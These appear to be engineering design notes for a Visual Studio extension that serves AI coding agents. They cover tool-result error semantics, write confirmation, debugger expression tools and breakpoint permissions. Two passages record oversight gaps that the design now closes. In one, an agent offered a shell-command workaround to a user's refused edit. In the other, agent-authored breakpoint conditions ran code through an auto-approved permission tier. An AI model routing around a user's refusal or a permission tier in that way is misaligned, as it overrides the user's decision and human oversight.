Shell-only, no IPC, the applier being in-proc. The same root reaches the tool catalog
(`VsToolCatalog.RelativePathRoot`), and **every tool taking a path the agent wrote uses it**: the
breakpoint tools from the start, `open_file` only since it was found rooting at the solution alone —
and, with no solution open, checking the still-relative path against devenv's install folder.

It stays a *fallback* rather than a requirement because the two roots coincide on most installs, which
is exactly why it sat unnoticed. Rooting is **refused rather than guessed** when no cwd is known:
`Path.GetFullPath` on a relative path resolves it against the **process** cwd, which is devenv's
install directory.

## Only the live-buffer read needs the UI thread when opening a diff

**`ShowDiffPreviewAsync` hops off the UI thread for everything except the VS calls that genuinely require it.** The UI thread is needed for exactly three things: the DTE open-document read (`TryGetOpenDocumentText`), the re-activation check (`IVsWindowFrame`), and `OpenComparisonWindow2`. The disk-fallback read, the hunk→full-file widening (a whole-file `IndexOf` scan plus two substring allocations over what can be a 100 KB+ source file) and both scratch-file writes are ordinary I/O and CPU, and none of it belongs on the thread painting the IDE — even though, unlike the retention sweep, this runs on a gesture the user initiated. The I/O half is not something a local timing can bound either: same AV/EDR, redirected-profile and VDI reasoning as the sweep ([settings-and-logging.md](settings-and-logging.md)).

**The hop order is load-bearing, not incidental.** It is UI (buffer read) → background (widen) → UI (re-activation check) → background (writes) → UI (open window), and the re-activation check **must** stay ahead of the writes. On a repeat click the window being re-activated may hold its own backing files open; a write failing on the sharing violation would fall into the method's best-effort catch and make the click do nothing at all. Folding the writes earlier to save a hop reintroduces exactly that.

**The widening moved to `Core.Ide.DiffSideBuilder`** — pure, static, no VS, no I/O, no thread affinity. Two reasons, in the order that matters: it is the expensive part, so it has to be off-thread anyway; and sitting in the Ide project none of its bail-out conditions could be tested at all, since the test project is net10 and `CodeWicket.Ide` is net472. Same argument as `Core.Ide.LineEndings`. Those bail-outs are worth testing because **returning null is the safe outcome** — the caller falls back to the raw hunk view — while getting one wrong is not: a confidently reconstructed "before" side that never existed, shown to the user as what their file used to look like. Pinned by `DiffSideBuilderTests`; the tolerance, uniqueness, nearest-match and CRLF-normalization rules were each verified load-bearing by injecting their bug.

## An agent's write opens the file in the BACKGROUND — the obvious helper cannot (#124)

**`VsShellUtilities.OpenDocument` always activates, and there is no argument that stops it.** Reported as: typing in the chat box, the agent lands an edit through the client fs, and the rest of the sentence goes into the editor. `TryWriteThroughBuffer` opened the document to reach its `ITextBuffer` and the helper's *last act* is an unconditional `windowFrame.Show()`. Nothing in the six- or seven-argument overloads avoids it.

**`NewDocumentStateScope` alone does NOT fix it, and that is the trap.** `NDS_NoActivate` is honoured by the *open*; the `Show()` comes after the scope has done its work, so wrapping the existing call changes nothing while looking exactly like the fix. So `OpenInBackground` drives `IVsUIShellOpenDocument.OpenDocumentViaProject` directly — the same call the helper makes — and reveals the frame with `ShowNoActivate()` instead. The scope is *still* applied, and is not redundant: it covers a project type whose own `OpenItem` activates on the way out, which our choice of reveal cannot reach. `Guid.Empty` (`LOGVIEWID_Primary`) is preserved, so which editor opens is unchanged.

**The tab still appears, deliberately.** The buffer route exists so the change dirties the real buffer and joins the undo stack — Ctrl+Z takes the agent's edit back — and that is worth a background tab. Writing straight to disk for a closed file would remove the tab and the undo with it. The `window?.Activate()` in the DTE fallback went the same way; nothing below it needs the window active to reach its `TextDocument`.

**Only the VS host can show this.** Both `VsEditApplier` and the terminal's twin ([backend-behaviours.md](backend-behaviours.md)) are devenv-only, so `--smoke` on either framework passes over the bug — the offline gates are a no-regression check here, not coverage. The confirmation is a run in Visual Studio, and it came back clean (**confirmed in Visual Studio, 2026-08-11**: the tab opens behind the chat, the caret stays in the composer, and Ctrl+Z in that tab still takes the agent's edit back — which is the half that proves `ShowNoActivate` didn't cost the buffer route its reason for existing). No automated check guards this, and none can: say so rather than leaving it implied.

## Tool results: when a call fails

**The axis is not "did something go wrong", it is "would the caller draw a false conclusion from treating this as success".** Three cases, and the middle one is the one that gets written wrongly:

1. **Couldn't run** — bad arguments, a service that isn't there, a timeout, an exception. Error, uncontroversially.
2. **Ran and produced a legitimate negative** — the build failed, tests failed, no references were found, `run_command` exited 1. **Success.** The negative *is* the information the caller asked for. `run_command` states this explicitly (`IsError` = start-failure/timeout only) and it generalizes: making these errors both discards a payload that is the actual answer and trains the agent to read "the build has errors" as "the build tool is broken".
3. **Ran, but the requested change did not happen** — error. The distinction from (2) is the useful part: the caller asked for an *effect*, not information, so when no effect occurred there is nothing to report and only a false impression to correct. **Queries report, mutations must confirm.**

**`IsError` is the only field an agent reliably reads, and this was measured rather than assumed.** `apply_code_fix` returned `isError:false` with `"applied":true` for a fix that changed nothing — while the same payload carried `"in 0 files (0 edits)"` and `filesChanged: 0`. The agent re-ran it twice on the strength of the prose summary, then gave up on the tool and edited the file by hand. Structured fields get skimmed; the summary is weighted. So the prose and `IsError` must agree, and an `applied:false` field is not a substitute for failing the call.

That case also carried the corollary: **advice in a payload is as load-bearing as the result.** The same summary said "N more diagnostics on this line offer the same fix — re-run to apply the next one", computed from the diagnostic list as it stood *before* the fix ran. One `IDE0055` formatting fix reformats the whole line and resolves its siblings, so the advice named work that no longer existed and the tool talked the agent into a loop it then confirmed as successful each time. The fix was to make the number true (re-check the line after applying) rather than to soften the wording.

**Where a query cannot distinguish "none" from "couldn't look", say so — do not fail.** `find_symbol`/`find_references`/`find_implementations` return an empty list both when the symbol isn't there and when no code is loaded to search. With no solution open the empty result is *true* (the semantic scope really is empty), so an error would assert a problem that doesn't exist; a `note` on the payload carries the same information without the lie, and `JsonOptions`' `WhenWritingNull` drops it entirely once projects are loaded. The case that genuinely misleads is narrower and gets its own wording: a solution **is** open but its projects haven't finished loading, so the empty list means "ask again shortly" — an agent reading that as "this type does not exist" is transiently and unreproducibly wrong, and the window is real, since the tool window opens while the solution is still loading. The two are told apart by the Roslyn solution's own `FilePath` (present with zero projects = still loading) rather than by asking DTE, which would need the UI thread these tools deliberately run off.

**Not every no-op is ours.** The same `apply_code_fix` guard fires on a live `IDE0055` whose "Fix formatting" action returns a solution identical to the input — checked by hand, VS's own light bulb does nothing on that line either. That is Roslyn reporting a diagnostic it cannot resolve, and this path faithfully reproducing the light bulb, which is the contract the tool is meant to have. Two successive versions of that message named a cause they could not observe (first a stale diagnostic, then headless invocation) and each sent the caller somewhere useless. **A message that guesses at a cause is worse than one that reports the observation and offers the escape hatch** — here, re-run `get_diagnostics`, and if it is still reported edit the file directly.

## A VS write must CONFIRM, and a refusal must not be routed around (issue #189)

**`ITextEdit.Apply()` does not throw when the editor rejects the change — it returns the UNCHANGED snapshot.** A read-only file (or one needing a source-control checkout) makes the editor raise its "make writable?" prompt from inside `Apply`; dismissing that prompt cancels the edit, `Apply` returns quietly, and `TryWriteThroughBuffer` answered `true`. So the write reported **success** to the agent with the file untouched — the one outcome the tool-result rule above forbids outright: a mutation that changed nothing has no answer to return, only a false impression to correct. Reproduce: mark the target read-only, dismiss the checkout prompt with Cancel.

**Three outcomes, not two.** `WriteRoute` is `Unavailable` / `Applied` / `Refused`, and the first two of those are what the old `bool` conflated with the third:

- `Unavailable` — this route isn't here (no adapters, no buffer, an exception). **Try the next one.**
- `Applied` — the file now holds the requested content.
- `Refused` — the editor was asked and said no. **Nothing was written and nothing else may be.**

Buffer → DTE → disk, but each step only runs while the one before said `Unavailable`. **Routing around a refusal is the thing that must not happen**: falling through to `File.WriteAllText` writes behind the user's own Cancel, and it cannot clear a read-only attribute anyway, so the fallback would fail with a worse message than the one we can give. A `Refused` throws an `IOException` rather than returning — see (3) in the rule above.

**Confirmed against the handle already in hand, never by re-reading the file.** Re-reading would have to guess its source, and the disk copy is legitimately stale here: the buffer route deliberately leaves the change unsaved when `TrySaveDocument` can't save it, so a disk comparison reports a *successful* edit as a failure and sends the agent into a retry loop. `edit.Canceled` is read **as well as** the text compared — the flag names the cause for the message, where the comparison only knows the content differs — and the comparison stands as the backstop for a rejection that doesn't set the flag.

### A HEDGED reason is worse than no reason, because the reader replaces it

Measured on the wire, and this is the part worth not re-deriving. A refusal saying the edit was rejected and that this "usually means the file is read-only or needs checking out" reached Kiro intact, and the agent then told the user *"likely because `temp.txt` is open in the editor — could you close or save it?"* and offered to write the file with a **shell command** instead. A cause we never suggested, advice that does not work, and a workaround that would have carried out the very change the user had just refused.

**Given a sentence that declines to commit, a model supplies its own and states it more confidently.** So `Core.Ide.FileWriteRefusal.Describe` says what was **CHECKED**:

- The **read-only attribute** — one cheap, definite file-system fact, which separates the common case from everything else. Where it holds, the message names it and **closes the workaround explicitly**, since an agent told only "this failed" reaches for the next tool that might not.
- Where it does not hold, **no cause is named at all** rather than a guess offered for the agent to firm up.
- **"Couldn't tell" is not "writable".** The attribute read can itself fail (the file may have gone), so `IsMarkedReadOnly` returns `bool?` and a null takes the no-cause shape — reporting it as the negative would assert a fact nobody established.
- **Both shapes say the file is UNCHANGED.** A half-landed write is a different situation and only we can say which this was; it is also the thing the agent most needs and cannot otherwise find out.

Pure and in **Core** because the wording *is* the behaviour, and because the applier that calls it is net472 and VS-bound; `FileWriteRefusalTests` asserts wording for the same reason.

## A build says which of the agent's files it did NOT compile (issue #257)

**The failure is a silent green.** Both backends write files themselves, and a non-SDK project enumerates its sources explicitly, so a new file lands on disk in no project: the build is green and the code does not exist. `get_diagnostics` is blind to it too (Roslyn's workspace is fed by the loaded project system). Three modes, all measured live on 2026-09-12:

- **Mode 1 — in no project.** Survives a full Clean+Rebuild. On the legacy `run_tests` path it is the worst case: the project runs against its built output assembly, so a new test file is neither compiled nor run and the count does not move (`succeeded:true, total:6, passed:4` byte-identical to baseline).

## One `catch` over a walk collapses the answers it was written to keep apart (issue #272)

`get_debug_output` already had the considered absent answer, and it was **unreachable in the case it was written for**. `ReadDebugPaneText` returned a string-or-null — null meaning "no Debug pane", which is true and useful, because it means no debug session has run in this instance — and the whole call sat under a single `catch (Exception)`. Anything throwing anywhere in the EnvDTE walk turned into `"could not read the Debug output pane: Unspecified error (Exception from HRESULT: 0x80004005 (E_FAIL))"`. Measured 2026-09-10: an experimental instance that has never run anything under its own debugger returns exactly this — the "nothing there" case, reported as "couldn't look".

**The cost is the hedged-reason lesson at one remove.** A bare HRESULT names no cause, so the reader supplies one — typically "the tool is broken" — when the instance simply has no debug session to report on, as it does whenever the program was debugged from *another* Visual Studio instance.

**Absence is not one fact, and neither is failure.** The walk can stop at four points and the agent's next move differs at each, so `Core.Ide.DebugPaneRead` has four sentences rather than two:

| Where it stopped | Outcome | Why |
|---|---|---|
| No Output window in this instance (null, **or the getter threw**) | **Absent** — success | The leading suspect for the E_FAIL. `ToolWindows.OutputWindow` throwing where the tool window was never created is an answer, not a failure. |
| Output window searched, no Debug pane | **Absent** — success | The original considered answer, now actually reachable. |
| The pane collection would not be walked | **Unreadable** — error | The search did not happen, so whether a Debug pane exists is **unknown**. It must not wear the empty pane's clothes. |
| Our pane found, its text would not be read | **Unreadable** — error | The one outcome here that was always a real failure. |

Three things about it that are not obvious from the table:

- **Both absent sentences name the instance.** They read the Debug pane of the Visual Studio this extension is loaded in; a program debugged from a different instance writes to that instance's pane. That is the one line that would have closed the originating session, and it is invisible from where the agent stands.
- **An absence inferred from a throw keeps the throw**, as a `note` on a *successful* payload (`JsonOptions`' `WhenWritingNull` drops it otherwise). The diagnosis above is reasoning from the code and was never reproduced under a debugger, so discarding the message would throw away the one thing that identifies the failing getter next time. It is a note, never an error — the answer is still the absent one.
- **Neither failure may be read as an empty pane**, and both say so in as many words. "Nothing was written" and "we could not look" lead to opposite next moves, and the second silently taking the first's shape is how an agent concludes a tracepoint never fired.

**The per-pane guard is the half the issue did not ask for.** The Output window holds every pane in the instance — ours, VS's, any extension's — and finding one means touching `Guid` on all of them. One stranger's getter throwing used to end the search, so whether a present, readable pane could be found at all turned on **which extensions happened to be installed**. `FindPane` skips a pane that will not say what it is (it cannot be the one we want) and is shared with `build_solution`'s Build-pane tail, where the same bug was **silent**: the backstop for "the build failed with nothing to act on" simply missing from the payload, indistinguishable from a build that left no output. `FindPane` deliberately does *not* catch around the enumeration itself — what a failed search is worth differs between an agent-facing error and a best-effort backstop, and that judgement stays with the callers.

Pure and in **Core** for `FileWriteRefusal`'s reason: the wording is the behaviour, and the walk that produces it is net472 and VS-bound. `DebugPaneReadTests` pins the four answers as four; **which one a given VS state produces needs a live Visual Studio instance** and nothing offline reaches it.

## An OPTIONAL enrichment may never fail the operation it decorates (issue #189)

`TryGetOpenDocumentText` threw a bare `E_FAIL` out of `TextDocument.StartPoint` — a background Miscellaneous-Files document on a fallback editor, which is what a path outside the solution with no registered editor factory gets — and **failed both the read and the write**, though each had a complete disk fallback behind it and the write had three untried routes.

**The asymmetry was the tell.** Its two *display* callers both caught and degraded; the two *agent-facing* ones — the pair deciding whether the user's files change — were the only two without a catch. The guard therefore lives **inside the `Try*` method**, which is what its name already promised, rather than at each call site where the next caller forgets it.

The disk fallback is **logged**, being the one case where our answer is knowingly not the best available: the buffer may hold unsaved text and we are about to answer from disk.

**The latent half is worse than the reported one.** The write failing is loud. The read failing alone hands the agent an exception where an empty-looking file was expected — or, on any path that softens it, an empty string — from which it concludes the file is empty and writes a reconstruction over an open, unsaved buffer. That is the same damaging shape as the missing-file read below, reached from the other direction.

## A read of a missing file FAILS; the range is shared (issue #111's sibling)

**`IEditApplier.ReadTextFileAsync` throws `FileNotFoundException` when the file isn't there. It must never return `""`** — and all three appliers used to (`VsEditApplier`, `StubIdeServices`, `ConsoleIdeServices`, each with its own copy of `File.Exists(full) ? File.ReadAllText(full) : string.Empty`).

This is the "couldn't run vs legitimate negative" rule applied to the surface the agent calls **directly**, without a tool result in between. An absent file and an empty one are indistinguishable to the caller, and the damaging shape is not the obvious one:

> The agent reads a path that resolves slightly wrong → gets `""` → concludes the file is empty → writes a complete "fixed" version to that path. A write **creates**, so it succeeds. The agent reports the edit done. The real file is untouched and nothing anywhere says so.

`Resolve` roots a relative path against the agent's own cwd, else the solution root (`AgentPath.PreferredRoot`), with no containment check — so a relative path resolving against an unexpected root lands silently, which is what makes the wrong-path case reachable rather than theoretical. With **neither** root known it refuses rather than guessing: there used to be a third fallback, `Directory.GetCurrentDirectory()`, which in devenv is VS's install directory, so a write would have created the file under Program Files and reported clean. It was unreachable in the VS host — `VsIdeServices` always has a root, the default workspace included — and is gone on the terms #54 settled, not on the terms of being unreachable.

**The boundary: a `line`/`limit` range past the end of a file that EXISTS is still empty**, not an error. We looked, and there is nothing there. Failing it too would teach an agent to read a harmless over-read as a broken file.

**The range itself is `Core.Ide.TextRange.Slice`, shared by all three appliers**, because they had three behaviours: the VS one honoured `line`/`limit` while the stub and Console ones **ignored both and returned the whole file**. That is the same defect one step along — the agent asks for lines 40–60, is handed 4000 lines, and cannot tell its range was dropped. **Which host an agent is talking to must never change what a read means**, so the divergence is removed by construction rather than by three copies agreeing. Found by a test written for the boundary above, which failed on the stub for a reason that had nothing to do with missing files.

Pinned by `EditApplierReadTests` against `StubIdeServices` — the applier the offline hosts actually serve to agents. The VS applier takes the identical change and can only be exercised in a live Visual Studio instance, like the rest of that class. What the agent *receives* for a failure, after two StreamJsonRpc hops, is issue #111.

## A client-fs failure reaches the agent with its reason intact (issue #111 — measured, no change needed)

**The worry, and why it was reasonable.** When the agent calls `fs/write_text_file` or `fs/read_text_file`, the applier's exception crosses **two** StreamJsonRpc hops before it sees anything — shell → engine, then engine → agent — and the engine rethrows whatever the first hop handed it. That is the same wrapping `AcpAgentSession.DescribeError` exists to *undo* for errors coming the other way, where `Message` is a generic protocol word and the real reason rides in `data`. If it worked that way in this direction too, the agent would be getting "Internal error" and either retrying the identical write or telling the user it had fixed a file it never touched. **The reader here is the agent, not a person** — a human given a useless error asks a question.

**It doesn't work that way.** Captured by the `clientfs-errors` Console proof:

```
applier threw : UnauthorizedAccessException: Access to the path 'C:\repo\locked.cs' is denied.
agent received: code=-32000
                message="Access to the path 'C:\repo\locked.cs' is denied."
                data={type=StreamJsonRpc.RemoteInvocationException, message=<the same>, stack=present}
```

Same result for a locked file (`IOException`), an invalid path (`ArgumentException`) and a missing file on read (`FileNotFoundException`). **The message survives both hops verbatim**, because StreamJsonRpc puts `ex.Message` in the JSON-RPC error message at each hop rather than a generic wrapper — the "Internal error + data" shape that prompted this is **Kiro's** formatting of its own errors, not StreamJsonRpc's. Two different directions, two different formatters, and conflating them is what made the concern look bigger than it was.

**What is lost is the exception TYPE.** `data.type` reads `StreamJsonRpc.RemoteInvocationException` — the outer wrapper — not `UnauthorizedAccessException`. Accepted rather than fixed: the sentence carries the reason, and no backend is known to branch on the type name. Worth knowing before anyone designs something that does.

**Why this proof needs no live backend.** It wires the real `ShellRpcTarget` ↔ `IpcIdeServices` ↔ `AcpClientTarget` over in-memory duplex streams and fakes only the applier. A read-only file, a denied directory and a locked handle are not reproducible on demand across machines, and the transport is what was in doubt — so the fake is at the layer whose behaviour is already known, and every layer whose behaviour was the question is real.

The read case is the missing-file `FileNotFoundException` from the section above; the proof feeds the transport that exception directly, so the two are pinned together — the applier raises a usable reason, and the transport delivers it.

## Reading the stopped debuggee: `read_expression` / `execute_expression` (issue #73, rung 3)

### Why the gate is a name

`read_expression` is `ToolRisk.ReadOnly` and cannot run code; `execute_expression` is
`ToolRisk.Command` and prompts every time below `AcceptAll`. One handler serves both, with the flag
bound where the two names are registered.

It was built first as ONE tool with an `allowSideEffects` argument, which is the better surface, and
that cannot be made safe: **a permission request for an MCP tool arrives before the `tool_call` frame
carrying its arguments.** Measured — `[permission] prompt: … risk=Command, args=none` — while the
banner fills the arguments in moments later, so a screenshot of the prompt shows them and looks like
proof they were available. The resolver's fail-safe then fired on the *safe* path and every guarded
read prompted.

A name is in the request from the first byte, and `_toolRisks`, `AllowedTools` rules and
remember-by-tool are all keyed on names already. `PermissionRequest.ArgumentsJson` survives as
**diagnostic only** — no policy may key on it — because the permission log reports it (`args=none`)
and that line is what diagnosed this.

`ToolDescriptor.RiskForArguments` was **removed rather than left with a warning.** It works on Kiro,
whose `tool_call` frame precedes the permission request, and fails toward "prompt always" on Claude,
where it does not — and **a facility whose safety DIRECTION depends on the backend is the thing not
to build.** Anything reaching for argument-derived risk in future is reaching for this.

### The same split, one rung down: `set_breakpoint` / `set_expression_breakpoint`

A breakpoint's `condition` and `printMessage` are **not stored data**. Visual Studio evaluates both
in the debuggee when the line is reached — function evaluation, property getters, method calls — so
an agent-authored expression placed by a tool authored `ToolRisk.Edit` reached rung 3's capability
through rung 1's tier, auto-approved at `AcceptEdits`, ran the next time they started debugging, and **persisted in
the `.suo` across restarts**. So the pair splits the same way: `set_breakpoint` stays `Edit` and
places a plain stop (line, hit count, reason); `set_expression_breakpoint` is `Command` and is the
only name that may carry either expression. One handler, the flag bound at registration.

Deciding it per call from the arguments is the same unavailable fix as above, for the same measured
reason — read the section you have just read before proposing it again.

**The plain name REFUSES an expression; it never strips one.** A `set_breakpoint` that quietly placed
an unconditional stop would report a breakpoint the agent believes is filtered, and the agent's next
sentence tells the user the loop only stops on iteration 47 — the `apply_code_fix` shape, where the
summary and the effect disagree and only the summary is read. The refusal names the row, says nothing
was set, and names the other tool (the `retryWith` lesson: name the tool, don't assert a boolean).
`ReadBreakpointSpecs` deliberately keeps reading both fields on both names, so what happens is the
refusal rather than a drop one layer lower.

The decision is in `Core.Breakpoints.Prepare(specs, root, allowExpressions)` — a **required**
parameter, no default, because a caller that forgot which name it was serving would forget in the
unsafe direction — and both names live there as constants so a refusal cannot name a tool that is not
registered. **The price is stated rather than hidden: a conditional breakpoint or a tracepoint now
costs one permission prompt below `AcceptAll` where it used to cost none.** That is the same price
`execute_expression` already charges for the identical capability. A plain stop is unchanged.

### The four attribute rules (`Core.Ide.DebugValueRules`)

In Core because each fails silently and none can be caught by inspection:

1. **Every refusal returns `hr=S_OK`.** The verdict lives in `DBG_ATTRIB_VALUE_ERROR` /
   `DBG_ATTRIB_VALUE_SIDE_EFFECT`. `Classify` takes flags and never sees an HRESULT, so it cannot
   make the mistake.
2. **`ERROR` without `SIDE_EFFECT` is ambiguous** between a refused property getter and a bad
   expression, and the attributes cannot separate them — so `MayNeedCode` states the ambiguity and
   the debugger's own message says which.
3. **A guarded EXPANDABLE result's summary may be a func-eval notice with NO error flag**, which is
   indistinguishable from a real `DebuggerDisplay` string and unmatchable by text in a localized VS.
   The summary is dropped for that shape; the children are the answer.
4. **`EnumChildren` ignores the guard.** It takes no eval flags, so expansion requests
   `NAME|TYPE|FULLNAME|ATTRIB` *without* `VALUE` and re-evaluates each child by its full name under
   the parent's flags.

### Bounds

`DebugEvalLimits`: 10 expressions, 24 members, **`MaxDepth = 1`**, 64 evaluations per call, 1500 ms
each, 1000 chars per value. The depth bound is a **parameter** on the recursive call rather than a
convention, because the path that forgets a convention is the recursive one — and that is exactly
an unbounded recursion here freezes the IDE. `DebugEvalBudget` is the backstop that makes the
*next* depth bug survivable; its skips are reported at call scope, never folded into one
expression's member count.

### It runs on the UI thread, deliberately

Off-thread is legal and costs the same (7.3 ms warm) but consumes the UI thread entirely — a 30 s
soak of 4,112 evaluations produced **zero** heartbeats against **463** in a control of equal length.
`[debug-eval]` records every call's UI-thread cost to `logs/debug-eval.log`, so a pathological call
shows up as a number instead of as someone noticing a stutter.

### What the payload must declare about itself

Four defects found by an agent *reading* a live response, none of which a test could have raised, all
fixed and re-verified 2026-08-28. They are one family — the payload failing to declare something it did
not do — and they are listed in the order they get worse.

**Grouping rows are not members.** `EnumChildren` returns the expression evaluator's display containers
("Static members", "Non-Public members", and `Raw View` on a `DebuggerTypeProxy` type) mixed in with real ones. Rendered as childless rows
they hid an exception's fields one level down, so every property was refused as a getter while the
backing fields sat unfetched — nothing protected, only the *spelling* out of reach. `Collect` steps
through them and splices their contents.

> **A container is not a level of depth.** `MaxDepth` bounds levels of OBJECTS; the container walk gets
> its own `MaxGroupDepth`. Written as "one level of children" it silently becomes two — the bound whose
> absence froze the IDE.

**`DebugExpansion`, and why it is not a bool.** The predicate deciding whether a summary may be reported
took `expansionYieldedMembers`, and that one bit had three distinct meanings to carry (the predicate is
`DebugValueRules.CanReportSummary`). Now four states,
the fourth added so arrays could be summarized safely:

| state | meaning | summary? |
|---|---|---|
| `YieldedMembers` | expanded, found members — they are the answer | no |
| `YieldedNothing` | expanded, found nothing — a null | **yes**, it is all there is |
| `NotAttempted` | never looked — may be a func-eval notice | no |
| `Summarized` | chose not to look, because the summary IS the answer | **yes** |

Children are evaluated with expansion off, so every one of them took `YieldedNothing`'s answer while in
`NotAttempted`'s state — and the debugger's refusal notice went back in the **value slot**, where it
reads as content rather than as an absence. Worse than the null bug it descends from.

`Summarized` exists only so arrays can be summarized without reinstating that: reporting a summary we
did not verify is safe when the decision was **ours**, made from the type, and not otherwise.

**A missing value names what we know.** `notExpanded` / `needsCode` / `notReadable`, plus the debugger's
own sentence. `function-evaluation-disabled` was proposed and cannot be established — the notice carries
no error flag and its text is localized — and it would lead the reader to the same place anyway.

**Primitive arrays are summarized, never walked.** By element type, not by length: a threshold needs the
length parsed out of a display string, and an agent wanting one element asks for `arr[3]`. The cost is
the point — each element is a guarded re-evaluation, so a 528-byte blob spent a third of the 64-call
budget on rows nobody can read.

**An omission names its members.** A count declares the truncation and cannot distinguish "nothing I
needed" from "the field I am looking for". Names are free — already in hand from the enumeration — and
`CountIsFloor` admits when the enumeration itself was cut short, which a count presented as exact would
under-report by an order of magnitude.

### The inner-exception chain: deliberately not built

Proposed twice — an ambient walk in the stop-reason line, then a `<debug-state>`-style pushable chip —
and dropped both times. The ambient line runs on **every prompt while stopped**, and detecting whether
`_innerException` is null is structurally expensive here: no attribute means null and the token is
language-dependent (C# `null`, VB `Nothing`), so the only test is *what expansion produced*, which costs
an expansion.

Against that, the pull costs one `read_expression` call per level and prompts nobody, because the guard
is a tool name. Measured live: `$exception._innerException` returns `_message`, `_HResult`, a null
`_stackTrace` and its own inner typed `{System.ArgumentNullException}` — each level complete in one call.

The debugger also reports a polymorphic member as `Declared {Runtime}` — `System.Exception
{System.InvalidOperationException}` — so the runtime type, which is most of what a chain would have
given, arrives for free. `DebugValueRules.RuntimeTypeName` takes it.

## The debugger in ambient context (issue #73)

`WorkspaceSnapshot.DebugSession` carries one line per prompt while a session is live: stopped or
running, where, why, the thread, and `stop N, process P`. It earns its place by the #95 rule —
**what the agent cannot get by asking.** Frames, locals and values are pullable and stay out.

- **Mode from `Debugger.CurrentMode`, never from the event stream.** AD7 has stop events and no
  matching resumed event, so a state machine built on it drifts, and a stale "stopped" is a confident
  wrong answer. The location comes from the cached stop and costs nothing.
- **Not debugging costs one property read.** Both early returns in `ReadDebugSession` precede any
  stack walk. `Ad7Evaluator.TopFrame()` exists so the stopped path reads one frame rather than
  twenty.
- **It crosses a wire.** Built IDE-side, rendered engine-side by `WorkspaceContextFormatter`. A field
  added to `WorkspaceSnapshot` and the formatter but not to `WorkspaceSnapshotDto` is dropped in
  transit, silently. **Three places, not two**, plus a round-trip test in
  `DtoMappingTests`. Note that `[debug-context]` appeared to *disprove* this: a timing line at one
  end of a transfer says nothing about the other end.
- **`stop N, process P` is a stop's identity**, because a pushed `<debug-state>` block carries no
  expiry. Observed live: a block said `depth = 4` over four frames while the pull said `depth = 2`
  over two, a restart having intervened. A count, not a timestamp — two stops seconds apart are still
  different stops.
- **`Ad7DebugEvents` is the subscription, not a probe.** `IVsDebugger` through `IVsDebugger10` expose
  no thread and no frame accessor, so **being told is the only route to either** — the cached stop
  the bullets above read from has no other source. Enumerated **unfiltered**, and cheap: 87–91 events
  a session, mostly `ModuleLoad`. Filtering was considered and dropped as a saving not worth the risk
  of discarding the one event a later rung needs.

## One breakpoint per LOCATION (issue #73)

Measured 2026-08-28: **clearing a breakpoint from the gutter removes every breakpoint at that
location.** So a second one added by automation is invisible in the gutter, unattributable when hit,
and destroyed by the user's next click — and it is a state only automation can create, which is what
makes refusing it free.

`set_breakpoint` therefore resolves by ownership: one of **ours** is removed and re-added (making the
tool idempotent per location, which also retires the `clear_breakpoints`-then-set dance, lossy because
clearing is all-or-nothing across the agent's breakpoints); the **user's** is never touched and comes
back as a third status, `conflict`, carrying its condition or hit count.

**Not one-per-line.** VS allows several breakpoints on one line at different *columns*, for lambdas
and chained calls. This tool takes no column, so everything it sets lands at one location — but a
future `column` argument must extend `FindBreakpointAt`'s match, or the rule starts refusing
breakpoints that would have been genuinely distinct.

Where two do exist anyway, the stop attribution **names neither and lists both**.
`Debugger.BreakpointLastHit` returns one breakpoint and nothing distinguishes two sharing a file and
a line; losing that coin toss on a conditional breakpoint renders as *"set by this conversation
(condition: i == 47)"*, from which the only reasonable inference is that **the condition held** — a
false claim about live data rather than a mislabel. Conditions are listed with an explicit "may or
may not have been met".
